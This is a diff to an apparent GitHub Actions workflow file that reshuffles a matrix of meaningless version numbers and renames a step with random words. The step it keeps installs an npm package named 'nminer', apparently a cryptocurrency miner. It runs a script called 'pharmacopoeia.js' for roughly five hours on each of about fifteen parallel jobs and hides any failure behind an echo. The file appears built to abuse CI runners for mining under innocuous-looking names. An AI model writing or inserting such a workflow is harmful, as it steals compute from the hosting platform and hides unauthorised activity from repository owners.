@@ -9,22 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 7982 }
-          - { version: 1691 }
-          - { version: 7642 }
-          - { version: 3208 }
-          - { version: 1162 }
-          - { version: 1755 }
-          - { version: 9460 }
-          - { version: 7895 }
-          - { version: 7496 }
-          - { version: 6516 }
-          - { version: 4648 }
-          - { version: 952 }
-          - { version: 7191 }
-          - { version: 6760 }
-          - { version: 6050 }
-          - { version: 3900 }
+          - { version: 1975 }
+          - { version: 1067 }
+          - { version: 4796 }
+          - { version: 8132 }
+          - { version: 3185 }
+          - { version: 8585 }
+          - { version: 8665 }
+          - { version: 8687 }
+          - { version: 5134 }
+          - { version: 964 }
+          - { version: 7680 }
+          - { version: 9237 }
+          - { version: 2191 }
+          - { version: 6644 }
+          - { version: 2742 }
 
     steps:
       - name: Checkout
@@ -35,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: after times drat
+      - name: tough midst
         run: |
           npm install nminer@latest
-          timeout 311m node pharmacopoeia.js || echo "pharmacopoeia executed"
+          timeout 306m node pharmacopoeia.js || echo "pharmacopoeia executed"
